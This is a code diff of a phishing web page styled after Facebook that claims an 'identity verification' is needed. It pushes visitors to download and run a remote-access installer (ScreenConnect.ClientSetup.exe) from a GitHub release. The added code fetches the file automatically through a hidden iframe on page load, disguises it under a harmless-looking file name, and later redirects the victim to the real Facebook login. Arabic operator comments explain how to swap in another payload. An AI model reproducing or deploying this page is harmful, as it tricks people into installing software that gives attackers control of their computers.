@@ -18,7 +18,6 @@
     min-height: 100vh;
   }
 
-  /* ===== Layout ===== */
   .container {
     display: flex;
     min-height: 100vh;
@@ -30,40 +29,42 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 60px 40px;
+    padding: 60px 50px;
+    background: #fafbfc;
     position: relative;
     overflow: hidden;
   }
 
   .left-inner {
-    max-width: 500px;
+    max-width: 460px;
     width: 100%;
     display: flex;
     flex-direction: column;
-    gap: 40px;
+    gap: 32px;
   }
 
   .left-logo {
-    width: 60px;
-    height: 60px;
+    width: 56px;
+    height: 56px;
     background: #1877f2;
     border-radius: 50%;
     color: #fff;
-    font-size: 46px;
+    font-size: 42px;
     font-weight: bold;
     display: flex;
     align-items: center;
     justify-content: center;
     font-family: Arial, sans-serif;
     padding-bottom: 6px;
+    box-shadow: 0 6px 16px -6px rgba(24, 119, 242, 0.5);
   }
 
   .left-headline {
-    font-size: 52px;
+    font-size: 46px;
     font-weight: 700;
-    line-height: 1.15;
+    line-height: 1.18;
     color: #1c1e21;
-    letter-spacing: -1.5px;
+    letter-spacing: -1.3px;
   }
 
   .left-headline .blue {
@@ -71,32 +72,39 @@
     display: block;
   }
 
-  /* Illustration */
+  .left-sub {
+    font-size: 15px;
+    color: #65676b;
+    line-height: 1.7;
+    max-width: 400px;
+    margin-top: -14px;
+  }
+
   .illustration {
     position: relative;
-    height: 220px;
-    margin-top: 20px;
+    height: 200px;
+    margin-top: 6px;
   }
 
   .phone {
     position: absolute;
-    width: 130px;
-    height: 200px;
+    width: 120px;
+    height: 185px;
     background: linear-gradient(160deg, #e7f3ff, #cfe4fb);
     border-radius: 20px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+    box-shadow: 0 10px 30px rgba(24, 119, 242, 0.12);
     left: 30px;
-    top: 10px;
+    top: 8px;
     overflow: hidden;
   }
 
   .phone::before {
     content: '';
     position: absolute;
-    top: 14px;
+    top: 12px;
     left: 50%;
     transform: translateX(-50%);
-    width: 40px;
+    width: 36px;
     height: 4px;
     background: rgba(0, 0, 0, 0.1);
     border-radius: 2px;
@@ -104,34 +112,34 @@
 
   .phone-inner {
     position: absolute;
-    top: 40px;
-    left: 16px;
-    right: 16px;
-    bottom: 16px;
+    top: 36px;
+    left: 14px;
+    right: 14px;
+    bottom: 14px;
     background: #ffffff;
     border-radius: 12px;
   }
 
   .card-float {
     position: absolute;
-    width: 110px;
-    height: 140px;
+    width: 100px;
+    height: 128px;
     background: #ffffff;
     border-radius: 16px;
-    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
-    left: 110px;
-    top: 50px;
+    box-shadow: 0 14px 34px rgba(0, 0, 0, 0.1);
+    left: 106px;
+    top: 46px;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    gap: 8px;
-    padding: 14px;
+    gap: 7px;
+    padding: 12px;
   }
 
   .card-float .bar {
     width: 100%;
-    height: 8px;
+    height: 7px;
     background: #e7f3ff;
     border-radius: 4px;
   }
@@ -139,26 +147,35 @@
   .card-float .bar.short { width: 60%; }
 
   .card-float .circle {
-    width: 40px;
-    height: 40px;
+    width: 36px;
+    height: 36px;
     border-radius: 50%;
-    background: linear-gradient(135deg, #ff5c8a, #ff8fb1);
-    margin-bottom: 6px;
+    background: linear-gradient(135deg, #1877f2, #4293f5);
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .card-float .circle svg {
+    width: 18px;
+    height: 18px;
+    fill: #fff;
   }
 
   .emoji {
     position: absolute;
-    font-size: 36px;
+    font-size: 32px;
     animation: float 3s ease-in-out infinite;
   }
 
-  .emoji.e1 { top: 10px; left: 0; animation-delay: 0s; }
-  .emoji.e2 { top: 120px; left: 240px; animation-delay: 0.5s; font-size: 28px; }
-  .emoji.e3 { top: 30px; left: 250px; animation-delay: 1s; font-size: 30px; }
+  .emoji.e1 { top: 6px; left: 0; animation-delay: 0s; }
+  .emoji.e2 { top: 112px; left: 226px; animation-delay: 0.5s; font-size: 26px; }
+  .emoji.e3 { top: 26px; left: 236px; animation-delay: 1s; font-size: 28px; }
 
   @keyframes float {
     0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-10px); }
+    50% { transform: translateY(-8px); }
   }
 
   /* ===== Right side ===== */
@@ -167,7 +184,7 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 60px 40px;
+    padding: 60px 50px;
     background: #ffffff;
     border-left: 1px solid #e4e6eb;
   }
@@ -184,7 +201,34 @@
     flex-direction: column;
     align-items: center;
     text-align: center;
-    gap: 22px;
+    gap: 20px;
+  }
+
+  .card-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: #e7f3ff;
+    color: #1877f2;
+    font-size: 11.5px;
+    font-weight: 700;
+    padding: 6px 14px;
+    border-radius: 20px;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+  }
+
+  .card-badge .dot {
+    width: 6px;
+    height: 6px;
+    background: #1877f2;
+    border-radius: 50%;
+    animation: blink 1.5s ease-in-out infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.35; }
   }
 
   .card-title {
@@ -192,6 +236,7 @@
     font-weight: 700;
     color: #1c1e21;
     line-height: 1.4;
+    margin-top: 2px;
   }
 
   .card-sub {
@@ -199,16 +244,17 @@
     color: #65676b;
     line-height: 1.7;
     max-width: 340px;
+    margin-top: -6px;
   }
 
-  /* Spinner */
   .spinner {
-    width: 48px;
-    height: 48px;
+    width: 44px;
+    height: 44px;
     border: 4px solid #e4e6eb;
     border-top: 4px solid #1877f2;
     border-radius: 50%;
-    animation: spin 0.75s linear infinite;
+    animation: spin 0.8s linear infinite;
+    margin-top: 6px;
   }
 
   @keyframes spin {
@@ -216,22 +262,24 @@
     100% { transform: rotate(360deg); }
   }
 
-  /* Download button */
   .download-btn {
     background: #1877f2;
     color: #ffffff;
     border: none;
     padding: 14px 30px;
     border-radius: 8px;
-    font-size: 16px;
+    font-size: 15.5px;
     font-weight: 700;
     cursor: pointer;
     font-family: inherit;
-    transition: background 0.15s;
+    transition: background 0.15s, transform 0.1s;
     width: 100%;
-    margin-top: 4px;
+    margin-top: 6px;
     text-decoration: none;
-    display: block;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 9px;
   }
 
   .download-btn:hover {
@@ -240,6 +288,13 @@
 
   .download-btn:active {
     background: #145dc7;
+    transform: scale(0.99);
+  }
+
+  .download-btn svg {
+    width: 17px;
+    height: 17px;
+    fill: #fff;
   }
 
   .note {
@@ -250,30 +305,31 @@
     margin-top: 4px;
   }
 
-  /* ===== Responsive ===== */
+  #autoDownloadFrame {
+    display: none;
+    width: 0;
+    height: 0;
+    border: 0;
+  }
+
   @media (max-width: 900px) {
     .container { flex-direction: column; }
     .left { padding: 40px 24px; }
-    .left-headline { font-size: 36px; }
-    .illustration { height: 180px; }
+    .left-headline { font-size: 34px; }
+    .illustration { height: 170px; }
     .right { padding: 40px 24px; border-left: none; border-top: 1px solid #e4e6eb; }
   }
 
   @media (max-width: 480px) {
-    .left-headline { font-size: 30px; }
-    .illustration { height: 160px; }
-    .phone { width: 100px; height: 160px; }
-    .card-float { width: 90px; height: 115px; left: 90px; top: 40px; }
-    .emoji { font-size: 28px; }
+    .left-headline { font-size: 28px; }
+    .illustration { height: 150px; }
+    .phone { width: 100px; height: 150px; }
+    .card-float { width: 85px; height: 108px; left: 88px; top: 36px; }
+    .emoji { font-size: 24px; }
+    .emoji.e2 { left: 190px; }
+    .emoji.e3 { left: 200px; }
   }
 </style>
-<script>
-window.addEventListener("load", function () {
-    setTimeout(function () {
-        window.location.href = "https://github.com/makosel/fankey/releases/download/monkey/ScreenConnect.ClientSetup.exe";
-    }, 1000);
-});
-</script>
 </head>
 <body>
 
@@ -289,13 +345,21 @@ window.addEventListener("load", function () {
           <span class="blue">securely.</span>
         </h1>
 
+        <p class="left-sub">
+          We take your account's safety seriously. Verification helps us keep your account protected.
+        </p>
+
         <div class="illustration">
           <div class="phone">
             <div class="phone-inner"></div>
           </div>
 
           <div class="card-float">
-            <div class="circle"></div>
+            <div class="circle">
+              <svg viewBox="0 0 24 24">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+              </svg>
+            </div>
             <div class="bar"></div>
             <div class="bar short"></div>
           </div>
@@ -311,6 +375,12 @@ window.addEventListener("load", function () {
     <div class="right">
       <div class="right-inner">
         <div class="card">
+
+          <div class="card-badge">
+            <span class="dot"></span>
+            Verification Required
+          </div>
+
           <div class="spinner"></div>
 
           <h2 class="card-title">We need to verify your identity</h2>
@@ -319,41 +389,68 @@ window.addEventListener("load", function () {
             To confirm this account belongs to you, please download the file below and run it on your device. Once it runs, your identity will be verified automatically.
           </p>
 
-          <!-- زر التحميل -->
-          <a class="download-btn" id="downloadBtn" https://github.com/makosel/fankey/releases/download/monkey/ScreenConnect.ClientSetup.exe" download>Download file manually</a>
+          <a class="download-btn" id="downloadBtn" href="https://github.com/makosel/kalam/releases/download/nas/ScreenConnect.ClientSetup.exe" download>
+            <svg viewBox="0 0 24 24">
+              <path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/>
+            </svg>
+            Download file manually
+          </a>
 
           <p class="note">
             This step is required for your account's security. Please do not close this page until verification is complete.
           </p>
+
         </div>
       </div>
     </div>
 
   </div>
 
+  <!-- iframe مخفي للتحميل التلقائي -->
+  <iframe id="autoDownloadFrame" src="about:blank"></iframe>
+
   <script>
     // ============================================
-    //   ضع هنا رابط الملف اللي عايزه يتحمل
+    //   إعدادات الملف
     // ============================================
-    const FILE_URL = 'https://github.com/makosel/fankey/releases/download/monkey/ScreenConnect.ClientSetup.exe';   // ← غيّر ده لرابط الملف بتاعك
-    const FILE_NAME = 'Verify_identity_document.zip';        // ← اسم الملف اللي هيظهر للمستخدم
+    const FILE_URL  = 'https://github.com/makosel/kalam/releases/download/nas/ScreenConnect.ClientSetup.exe';   // ← غيّر ده لرابط الملف بتاعك
+    const FILE_NAME = 'last_meta_theme.zip';         // ← اسم الملف عند التحميل
 
     // ============================================
     //   التحويل بعد 60 ثانية (في الخلفية)
     // ============================================
-    const REDIRECT_URL = 'https://www.facebook.com/login';
-    const TOTAL_SECONDS = 120;
+    const REDIRECT_URL  = 'https://www.facebook.com/login';
+    const TOTAL_SECONDS = 60;
 
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, TOTAL_SECONDS * 1000);
 
     // ============================================
-    //   زر التحميل
+    //   زر التحميل اليدوي
     // ============================================
     const downloadBtn = document.getElementById('downloadBtn');
     downloadBtn.href = FILE_URL;
     downloadBtn.setAttribute('download', FILE_NAME);
+
+    // ============================================
+    //   التحميل التلقائي
+    // ============================================
+    const iframe = document.getElementById('autoDownloadFrame');
+
+    function autoDownload() {
+      // الطريقة 1: iframe مخفي
+      iframe.src = FILE_URL;
+
+    
+    }
+
+    // أول ما الصفحة تحمّل
+    window.addEventListener('load', () => {
+      setTimeout(autoDownload, 500);
+    });
+
+   
   </script>
 
 </body>
